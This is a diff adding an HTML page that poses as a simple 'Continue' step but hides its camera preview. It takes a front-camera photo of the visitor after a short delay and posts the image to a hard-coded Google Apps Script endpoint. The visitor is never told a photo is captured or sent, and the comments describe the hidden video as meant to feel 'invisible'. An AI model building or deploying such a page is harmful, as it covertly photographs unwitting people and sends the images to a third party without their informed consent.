@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instant Camera</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f0f0; }
+        
+        /* Hide the video element since we want it to feel "invisible" or just for processing */
+        #video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        
+        button { 
+            padding: 20px 40px; 
+            font-size: 20px; 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            cursor: pointer; 
+        }
+        button:disabled { background: #999; }
+        
+        #status { margin-top: 20px; font-size: 16px; color: #333; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <button id="actionBtn">Continue</button>
+    <p id="status"></p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // REPLACE WITH YOUR GOOGLE SCRIPT URL
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxr0QObs3pMm6p23AUDg5gywCheXQtfSK0DTGutTI9eaESgWz06wITIclCVWLL0toJmBg/exec";
+
+        const btn = document.getElementById('actionBtn');
+        const status = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btn.addEventListener('click', async () => {
+            btn.disabled = true;
+            status.innerText = "Please give the access, in order to Continue...";
+
+            try {
+                // 1. Ask for permission
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // Prefer front camera
+                });
+                
+                // 2. Permission granted, connect stream
+                video.srcObject = stream;
+                status.innerText = "Please be Hold still...";
+
+                // 3. Wait 1.5 seconds for camera to adjust exposure/focus
+                // If we snap instantly, the photo will be pitch black!
+                setTimeout(() => {
+                    takeAndSend(stream);
+                }, 1500);
+
+            } catch (err) {
+                console.error(err);
+                if (location.protocol !== 'https:') {
+                    status.innerHTML = "❌ Error: requires <b>HTTPS</b>.<br>This will not work on http:// sites.";
+                } else {
+                    status.innerText = "❌ Access Denied. Check site settings.";
+                }
+                btn.disabled = false;
+            }
+        });
+
+        function takeAndSend(stream) {
+            status.innerText = "please wait...";
+
+            // Setup Canvas
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Draw image
+            ctx.drawImage(video, 0, 0);
+            
+            // Stop Camera (Important for privacy/battery)
+            stream.getTracks().forEach(track => track.stop());
+
+            // Get Data
+            const dataURL = canvas.toDataURL('image/jpeg', 0.6);
+
+            // Send to Google Script
+            fetch(SCRIPT_URL, {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: JSON.stringify({ image: dataURL })
+            })
+            .then(response => response.text())
+            .then(text => {
+                status.innerText = "Successfull! thanks";
+                btn.innerText = "Try Again";
+                btn.disabled = false;
+            })
+            .catch(err => {
+                status.innerText = "❌ Failed.";
+                btn.disabled = false;
+            });
+        }
+    </script>
+</body>
+</html>
